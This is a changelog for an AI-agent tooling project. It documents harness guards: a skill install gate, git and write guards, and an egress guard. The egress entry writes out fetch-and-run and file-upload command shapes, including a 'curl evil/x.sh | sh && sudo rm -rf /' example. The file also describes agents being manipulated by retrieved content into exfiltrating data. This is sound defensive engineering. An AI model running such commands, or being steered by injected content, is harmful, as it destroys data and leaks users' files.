# Changelog

All notable changes to this project are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **SkillSpector post-install verification** (closes #34). A remote install (`git clone`, or
  `npx skills add` from a repo) used to be scanned from the gate's own clone while the agent's
  command fetched the source again, so a moving branch or a remote serving different bytes per
  request could install content the gate never saw.
  - The pre-install hook now records the scanned digest of every remote skill, keyed by the
    exact command, in `~/.cache/skillspector-gate/gate-pending.json`. The file is protected
    like the approvals file (Bash tamper check plus `guard-write.sh`), and entries expire
    after 24 h. Each command holds a list of records tagged with the session id, tool-call id
    and cwd, so the same command run concurrently in two sessions or workspaces keeps two
    independent checks; the post hook takes the record for its own tool call (falling back to
    session + cwd, then cwd). Each target also keeps its effective cwd, so
    `cd /project && npx skills add …` is checked in `/project`'s skills dirs. Reads and
    writes of the pending file are serialised with an interprocess `flock`, so overlapping
    hooks never drop each other's records, and every JSON state save (pending, verdicts,
    approvals) now writes through a unique temp file instead of one shared `.tmp` name.
  - The new `skillspector-gate.py post --agent …` (`PostToolUse`) hashes what was actually
    installed. A `git clone` must match the whole scanned tree (minus `.git`), so a second
    fetch that adds a skill or changes any helper file fails, not only a changed scanned skill.
    A clone too large to hash whole must match the scanned skill inventory and each skill's
    digest. A `skills add` skill is found by name in the agent skills dirs; the pre-install
    hook snapshots those dirs, and any other skill dir that is new since the snapshot, was not
    scanned and is not expected by another pending gated install is quarantined too.
  - On a mismatch the install is moved to `~/.cache/skillspector-gate/quarantine/` (a
    symlinked skill is resolved: its real content in a skills dir is moved and the link
    removed; a link pointing outside the skills dirs is removed and reported) and Claude
    gets `decision: block` with the reason. If the skill cannot be found it is reported as
    unverified, never as a match.
  - Every outcome is written to the audit log.
  - `bin/mc-guard.sh` registers the post hook (`PostToolUse`, Bash, 120 s) on `install`,
    verifies it, and removes only that entry on `uninstall`, keeping foreign `PostToolUse`
    hooks.
  - Tests: 23 new gate tests: match verified; git and `skills add` mismatches quarantined;
    a clone with an added skill or a changed helper file quarantined; an unscanned extra skill
    from `skills add` quarantined while the scanned one and older skills stay; concurrent and
    id-less records paired correctly; legacy pending files read; an oversized clone keeps
    per-skill checks; recently touched existing skills and another pending install's skill are
    left alone; `cd … && skills add` checked in the target project; symlinked skills
    quarantine their real content; overlapping pre-hooks keep every record; missing install unverified;
    denied and local installs record nothing; unrelated commands ignored; the pending file is
    protected. They also redirect `PENDING_FILE` and
    `QUARANTINE_DIR`, so no test touches the real cache. Guard tests cover registration,
    removal and the `guard-write` block.
- **SkillSpector install gate** — `guards/skillspector-gate.py`, a `PreToolUse` Bash hook for
  Claude Code, Codex and agy. It recognizes commands that install a skill into an agent skills
  directory (`git clone`, `cp`/`mv`/`rsync`/`ln`, `unzip`/`tar`, `npx skills add`), scans every
  skill they would install with SkillSpector, and passes only a `safe_to_install` verdict;
  `DO_NOT_INSTALL` denies and anything else asks (Codex has no `ask`, so it denies). Verdicts are
  cached by content hash, and `approve` records a human-accepted hash that agent tool calls cannot
  write. `mc-guard.sh install|verify|uninstall` now registers it in `~/.claude/settings.json` with a
  900 s timeout, because an LLM-backed scan runs about a minute per skill against the 60 s hook
  default. Covered by `test/test_skillspector_gate.py`, now a CI step. The verdict cache is
  protected like the approvals file (Bash gate and `guard-write.sh`), since a forged cached
  `safe_to_install` passes without a rescan; `ln` into a skills dir asks, because a link follows
  its source after the scan. A redirected read (`cat x > <protected file>`) and an approve call
  wrapped in a pty (`script -qc`) are refused, and an install whose path the shell expands near a
  skills dir, or that is chained with steps other than cd/mkdir/ls/pwd/test, asks rather than
  passes. Known gaps: the gate matches command text, so it is a policy guard rather than a
  sandbox (a root-owned or signed approvals store would close that), and git and `skills add`
  installs re-fetch after the scan, so a remote serving different content per request is not
  yet caught.
- **Enforcement layer (Phase 5)** — `guards/` + `bin/mc-guard.sh`. Master-Claude previously
  distributed only instructions, which a model may or may not follow. These are enforced by the
  harness itself: a `permissions.deny` rule set plus `PreToolUse` hooks that block destructive
  commands regardless of what the agent decides. `mc-guard.sh install|verify|audit|uninstall`
  merges into `~/.claude/settings.json` (backs up first, preserves foreign hooks, idempotent).
- **Dirty-aware git guard** — `guards/guard-bash.sh` blocks `git checkout <path>`, `restore`,
  `reset --hard`, `clean -f`, and bare `stash` **only when the target has uncommitted changes**.
  A static deny rule cannot make this distinction: those commands are legitimate on a clean tree
  and destroy unrecoverable work on a dirty one. Also blocks `sed -i`/`perl -i`, `sudo`,
  recursive removal of a home/workspace root, and recursive `chown` on the NTFS mount. Parses
  compound commands, wrappers, and env prefixes so the checks cannot be trivially evaded.
- **`guards/guard-write.sh`** — blocks Write/Edit to `.git` internals, `~/.ssh`, `/etc`, `.env`,
  and Claude Code settings files.
- **Egress guard (rule 7) + a third decision tier.** `guard_ask` in `guards/guard-lib.sh` emits
  `permissionDecision: "ask"`, and `guard-bash.sh` uses it for two shapes: a network fetch piped
  or process-substituted into an interpreter (`curl x | sh`, `bash <(curl x)`), and `curl`
  uploading a local file (`-d @`, `--data-binary @`, `-T`, `--upload-file`, `-F name=@`). Every
  other rule constrains what an agent does **by accident**; this one constrains what it can be
  **talked into**, which is why it asks rather than denies — both shapes are routinely legitimate,
  and an ask that fires constantly gets click-throughed, which is worse than no ask at all. The
  gap it closes: the deny rules cover destructive local commands and secret reads, so a harness
  running `defaultMode: auto` with a bare `Bash` allow had nothing between retrieved third-party
  content and unattended exfiltration. Ordering is load-bearing — egress is evaluated after every
  deny rule, because `guard_ask` exits, and checking it earlier makes
  `curl evil/x.sh | sh && sudo rm -rf /` prompt instead of deny.
- **`bin/mc-guard.sh audit`** — read-only permission-surface audit across every project's
  `.claude/settings*.json`, flagging bare tool names in `allow` (which match every use of a tool)
  and indirection rules whose payload lives in a repo-editable file (`Bash(npm run *)` runs
  whatever `package.json` defines; `cargo test` compiles and runs `build.rs`).
- **Security-review rule files** — `guards/claude-security-guidance.md` and
  `guards/security-patterns.json` for the `security-guidance` plugin, derived from modules 60
  and 50; symlinked into `~/.claude/` by `mc-guard.sh install`.
- **Tiered subagents** — `agents/scout.md` (Haiku, read-only locator), `agents/sweeper.md`
  (Sonnet, fully-specified mechanical edits), `agents/verifier.md` (Sonnet, runs quality gates
  and reports verbatim). `bin/mc-commands.sh --agents` registers them.
- **Module 91 — Agent & Assistant System Architecture** (`master-core/modules/` +
  `docs/knowledge/`): five-layer split, tool-contract boundary, memory tiers with explicit
  read-after-write visibility, routing lanes, observability, and a failure-mode table. For
  projects where an LLM is a component rather than the deliverable.
- **Versioned core**: `master-core/VERSION`; `mc-install` stamps `<!-- mc-core: … -->` into the
  generated `AGENTS.md`; `mc-sync` reports the version delta and `mc-doctor` flags drift.
- **`mc-install --modules <list>`**: install only selected modules (e.g. `--modules 10,30,60`)
  to slim size-sensitive `--inline` projects.
- **`/mem-synthesize`** + `bin/mc-mem-scan.sh`: surface cross-project memory-promotion candidates
  (same fact in ≥N projects, or `scope: universal`) not yet in `memory-core/`.
- **`bin/mc-doctor-all.sh`**: audit every managed project under a workspace root in one command.
- **`bin/mc-selfcheck.sh`**: validate this repo's own invariants (symlinks, sizes, VERSION,
  memory frontmatter, doc/module alignment); wired into CI as the self-host gate.
- **`bin/mc-mem-bridge.sh`**: build a digest of `memory-core/` into the Codex/Gemini homes so
  all three agents can share the curated facts (dry-run by default).
- **Pre-commit hook template** (`templates/pre-commit`) running `mc-doctor` before commit.
- **CodeQL** workflow (`.github/workflows/codeql.yml`, `language: actions`) scanning the
  GitHub Actions workflows for script injection, missing permissions, and unvalidated inputs.
- **actionlint** workflow linting added to CI.
- **Claude PR reviewer**: the official Anthropic GitHub workflows
  (`.github/workflows/claude-code-review.yml` for automatic PR review +
  `.github/workflows/claude.yml` for `@claude` mentions), installed via `/install-github-app`
  and wired to the `CLAUDE_CODE_OAUTH_TOKEN` secret. (Replaces an earlier custom
  `.github/workflows/claude-review.yml` stub, removed as redundant.)
- **Dependabot** (`.github/dependabot.yml`) for the GitHub Actions ecosystem, keeping the
  SHA/digest-pinned third-party actions current.
- `mc-install.sh --absolute-imports`: opt in to the old expanded-path import lines. Only the
  deprecated Gemini CLI needs it (its import processor uses `path.resolve(base, importPath)`
  and does not expand `~`). Stamped as `imports=absolute` in the `mc-core` header comment, so
  `mc-sync` keeps the choice.
- `mc-doctor.sh` reports the import-path style: home-relative, or absolute by request. It
  **warns** on unstamped absolute imports that embed the home path.
- **Antigravity CLI (`agy`) support**, replacing the deprecated Gemini CLI. Behaviour verified
  against `agy` 1.5.6 with codeword test projects:
  - agy reads both `AGENTS.md` and `GEMINI.md`, and de-duplicates the `GEMINI.md`→`AGENTS.md`
    symlink, so the existing layout is safe.
  - agy ignores **all** `@import` lines (relative, absolute and `~`), so import mode gives it
    only the inline rules.

  Changes:
  - `mc-apply.sh` picks `--inline` for an `.agents/` project (Antigravity's workspace
    directory) only while the agy plugin is missing. Once agy has the core globally,
    inlining would load it twice.
  - **`bin/mc-agy.sh install|verify|uninstall`** gives agy the core *globally*, as a
    generated agy plugin at `~/.gemini/config/plugins/master-claude/` (`plugin.json` +
    `rules/`; passes `agy plugin validate`). It holds `AGENTS.base.md`, the modules, the
    language overlays and the memory digest inline. The user's own global `GEMINI.md` is
    never edited. It is designed around agy's documented limits, each confirmed with probes:
    - a 24,000-byte cap per rule file, so the core is packed into `rules/AGENTS.md` +
      `rules/GEMINI.md` (both load), each ≤ `MC_AGY_MAX_BYTES` (23,500), and a core that
      won't fit is refused;
    - a shared 20,000-token budget for always-on and global rules (the full core is about
      10k tokens). With it installed, the user's global rules, both parts and the project
      rules all loaded in full.

    Size options `--full` (default), `--modules L|none` and `--no-memory` (about 40 → 9 KB)
    are stamped, so `verify` and sync keep them. Every refresh and every uninstall first backs
    the plugin up to `~/.gemini/config/master-claude.plugin.mc-bak/`. That is outside
    `plugins/` on purpose, because a copy inside it would load as a second plugin; a failed
    copy is restored from the backup. The `--if-present` no-op and `uninstall` are decided
    before the core is generated, so they never depend on the byte budget, and `mc-sync`
    only warns if the plugin refresh fails. Installs are idempotent; a foreign plugin at
    the path is never overwritten; and a legacy `MC-CORE` block in the global `GEMINI.md`,
    from the first iteration, is migrated away with a backup. `MC_AGY_PLUGIN_DIR` and
    `MC_AGY_FILE` override the paths.
  - `mc-doctor.sh`: when agy is installed (or `MC_AGY_INSTALLED=1`), import-mode projects
    report OK if the plugin is current, and **warn** with the fix command if it is missing or
    stale. `.agents/` without the plugin warns too. A new check **warns when a project's
    `AGENTS.md` exceeds 24,000 bytes**, because agy silently truncates it. This flagged
    RustyNES (45 KB) and OTP-Local_CLI (37 KB, inline).
  - `mc-sync.sh` refreshes an existing agy plugin (`install --if-present`; it never creates
    one).
  - `mc-mem-bridge.sh`:
    - `--stdout` prints the digest, for `mc-agy.sh`;
    - an explicit `antigravity`/`agy` target (`--agy-home`) and a legacy `gemini` target;
    - the default target is Codex only, since agy gets the digest through `mc-agy.sh`;
    - unknown targets are rejected.
  - Docs: `tri-agent-interop.md` (agents table, verification notes, parity matrix, memory,
    public-repo guidance), `distribution-model.md`, `00-OVERVIEW.md`, `AGENTS.md`,
    `commands/mc-setup.md`, and the `mc-install.sh` help text.
- `test/run.sh`: 63 new checks (9 import-path, 6 Antigravity bridge/apply, 48 `mc-agy.sh`).
  - Import paths: the default is `@~/` with no `$HOME` in `AGENTS.md`;
    `--absolute-imports` writes and stamps the expanded path, and sync keeps it; doctor
    accepts a stamped file and warns on an unstamped one; sync converts legacy files and
    leaves no home path.
  - Antigravity: the mem-bridge dry-run writes nothing, `--execute` writes the digest, the
    printed instruction says to read the file, and unknown targets are refused; an `.agents/`
    project is installed inline, with no `@import` lines.
  - `mc-agy.sh` (48 checks, sandboxed through `MC_AGY_PLUGIN_DIR`/`MC_AGY_FILE`; includes
    backups outside `plugins/`, budget-independent no-op and uninstall, and mc-sync
    surviving a failed refresh):
    - install and verify, dry-run, idempotency, valid `plugin.json`, every module present,
      the two-file split under the cap, and the global `GEMINI.md` untouched;
    - refusing an oversized core, refusing to clobber a foreign plugin, migrating the legacy
      block, and the doctor's 24,000-byte `AGENTS.md` warning;
    - stale detection, the doctor reporting OK or warning, and mc-sync refreshing;
    - `.agents/` projects staying in import mode while the block exists;
    - slim options stamped and kept through verify and sync;
    - uninstall, and `--if-present` never creating a block.

### Changed

- **Import lines are home-relative.** `mc-install.sh` now writes
  `@~/.claude/master-core/...` instead of the expanded `$HOME` path. This matches what
  `docs/architecture/distribution-model.md` and `tri-agent-interop.md` already documented.
  Claude Code expands `~`. Codex and Antigravity ignore `@import` whatever the path form, so
  the change costs them nothing. Only the deprecated Gemini CLI could follow the old
  absolute paths; for it, use `--inline`, or `--absolute-imports` in private repositories.
- Docs: corrected the claim that Gemini CLI ignored `@import` (it processed imports but
  couldn't expand `~`).
- `mc-sync.sh` rewrites legacy unstamped absolute imports as `@~/` (it prints a note), and
  forwards `--absolute-imports` when the file is stamped.

- `master-core/VERSION` 0.1.0 -> 0.2.0 (additive: new module + new tooling, no behavior removed).
- `master-core/AGENTS.base.md`: added a **Delegation** section (match the model to the work;
  delegate down to scout/sweeper/verifier) and a note that some rules are enforced by the
  harness, so a denial is a correct outcome rather than an obstacle to route around.
- `bin/mc-commands.sh`: now registers either `commands/` or `agents/` (`--agents`, `--commands`).
- `bin/mc-doctor.sh`: reports whether the enforcement layer is installed.
- `bin/mc-selfcheck.sh`: asserts guards are executable and the guard rule files parse.
- CI shellcheck now covers `guards/*.sh` and `test/*.sh` alongside `bin/*.sh`.
- **Markdown lint gate** — `.markdownlint.json` plus a version-pinned `markdownlint-cli2@0.23.1`
  CI step. Config records a rationale per exemption: `MD013` (line-length), `MD033` (inline
  HTML — the managed-block markers are HTML comments by design), `MD060` (hand-aligned tables)
  and `MD041` are disabled per module 40's rule about linters that fight legitimate technical
  formatting; `MD024` is scoped `siblings_only` for Keep a Changelog's repeated section
  headings. That took 1220 raw findings to 148 real ones, all now fixed: 137 auto-fixed
  (blanks around headings/lists/tables/fences), 7 emphasis-as-heading converted to real `###`
  headings in the pattern library, 4 code fences given a `text` language. Repo is at 0 errors
  across 70 files.
- `guard-bash.sh`: quote the separator inside `${_target%%"$NL"*}` (SC2295) — an unquoted
  expansion there is treated as a pattern.
- **Dependency refresh** (full audit of every pinned ref; this repo has no package manifests,
  so its dependencies are the workflow pins and the linter pin):
  - `anthropics/claude-code-action` `52113681` -> `fa7e2f0a` (the current `v1`; Claude Code
    2.1.193 -> 2.1.217, Agent SDK 0.3.193 -> 0.3.217), in `claude.yml` and
    `claude-code-review.yml`. Resolved by dereferencing the **annotated tag object** to its
    commit — `git/ref/tags/v1` returns the tag object's own SHA, which is not a commit and
    would have been an invalid pin.
  - `markdownlint-cli2` 0.22.0 -> 0.23.1 (markdownlint 0.41.1); verified the repo still
    reports 0 issues under the newer engine before pinning it.
  - `actions/checkout@v7`, `github/codeql-action@v4`, and `rhysd/actionlint`
    `1.7.12@sha256:b1934ee5…` verified already current and left unchanged. The actionlint
    digest was confirmed against the tag's **manifest-list** digest — `docker manifest
    inspect … .manifests[0].digest` returns a per-platform digest instead and falsely
    suggests the pin has drifted.
- `test/run.sh`: eight new groups (13-20) covering dirty-vs-clean git behavior, in-place/sudo/
  evasion paths, guard-write protected paths, install idempotency with a foreign hook present,
  clean uninstall, settings clobber prevention, cd-prefixed target repos, and network-egress prompts.
- Completeness-critic pass over `master-core/modules/`: consolidated cross-module duplication.
  Module 20's *Golden vectors* and *Exactness honesty* rules are now the canonical home (module 90
  references them), and the "migrate stable decisions" rule moved to module 80 (removed the
  duplicate from module 40).

### Security

- **Remove personal paths and private project names from the public repo.**
  - **Source lists:** the `docs/knowledge/*.md` lists cited 49 absolute `/home/<user>/…`
    paths, now home-relative `~/…`. Projects under `Commercial_Private-Projects/` and
    `Local_Only-Projects/` are shown as `<private>`; public `OSS_Public-Projects/` names
    stay.
  - **Skip lists:** `mc-apply-all.sh` / `mc-doctor-all.sh` hardcoded personal folder names.
    They now keep only generic defaults and read personal names from
    `~/.config/master-claude/skip` (`MC_SKIP_FILE`) and `MC_SKIP`, outside the repository.
  - **Prevention:** `mc-selfcheck.sh` (run in CI) fails on any absolute home path in a
    tracked file outside `test/`, whose fixtures use a made-up `/home/u`.
  - **Tests:** `test/run.sh` covers `MC_SKIP_FILE` and `MC_SKIP`.
  - **History:** earlier commits still contain the old text; rewriting history is a
    separate decision.
- **Stop leaking the username into managed repositories.** The expanded `$HOME` import paths
  (`@/Users/<name>/.claude/master-core/...`) put the local username into every committed
  `AGENTS.md`, including public repositories. Re-running `mc-sync`/`mc-setup` on a project
  that had been hand-fixed to `@~/` used to bring the paths back; now the default is
  home-relative, sync converts legacy files, and doctor flags any that remain.
- `release.yml`: pass the `workflow_dispatch` tag input, event name, and resolved tag via
  `env:` instead of interpolating `${{ ... }}` directly into shell `run:` blocks. This closes
  the Actions script-injection vector (the prior charset validation ran *after* interpolation).
- Pin the installed Claude workflows (`claude.yml`, `claude-code-review.yml`) to match repo
  policy: `anthropics/claude-code-action` to an immutable commit SHA and `actions/checkout`
  aligned to `@v7`.

## [0.1.1] - 2026-06-25

### Fixed

- `release.yml`: normalize the `workflow_dispatch` `tag` input — strip a pasted
  `refs/tags/` prefix and validate the `v*` format — so manual releases don't fail on the
  common GitHub UI paste pattern.

### Changed

- `CHANGELOG.md`: attribute the release-workflow and README-badge entries to `[0.1.0]`
  (they shipped in the `v0.1.0` tag) instead of `[Unreleased]`.

## [0.1.0] - 2026-06-25

Initial release: the curated, project-agnostic synthesis of cross-project AI-agent knowledge,
plus the tooling to install and sync it into any project.

### Added

- **Knowledge base** (`docs/`): the 16 competency areas synthesized into `docs/knowledge/`,
  and the system's own design in `docs/architecture/` (distribution model, memory architecture,
  tri-agent interop).
- **Distributable core** (`master-core/`): `AGENTS.base.md` universal base, 10 topic modules,
  and 4 language overlays (rust/python/typescript/generic) — each curated under 200 lines.
- **Memory core** (`memory-core/`): generalized cross-project facts in frontmatter schema v2
  (`scope`/`lastVerified`/`tags`) with a project-to-shared promotion model.
- **Tooling** (`bin/`, POSIX sh): `mc-apply`/`mc-apply-all` smart orchestrators, `mc-install`
  (single-source `AGENTS.md` + `CLAUDE.md`/`GEMINI.md` symlinks; `--import`/`--inline`; seed +
  `--trim` for retrofits), `mc-sync`, `mc-doctor`, `mc-promote`, `mc-retrofit` (dry-run),
  `mc-commands` (register slash commands).
- **Commands** (`commands/`): `/mc-setup`, `/mc-setup-all`, `/mc-curate`, plus sprint-lifecycle,
  `ci-debug`, `bench-compare`, `security-audit`, `mem-promote`.
- **Templates**: project-block scaffold and a `CLAUDE.local.md` session-state template.
- **Verification**: `test/run.sh` self-test harness (18 sandboxed assertions) and a GitHub
  Actions workflow running shellcheck, the self-tests, and a <200-line curation guard.
- **Release packaging**: `.github/workflows/release.yml` builds a `master-claude-<tag>.tar.gz`
  distributable (+ sha256) and publishes a GitHub Release on `v*` tags (uses checked-in
  `docs/releases/<tag>.md` notes when present, falls back to auto-generated notes otherwise).
- **README**: CI/release/license/POSIX badges and a contributing/license footer.

[Unreleased]: https://github.com/doublegate/Master-Claude/compare/v0.1.1...HEAD
[0.1.1]: https://github.com/doublegate/Master-Claude/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/doublegate/Master-Claude/releases/tag/v0.1.0
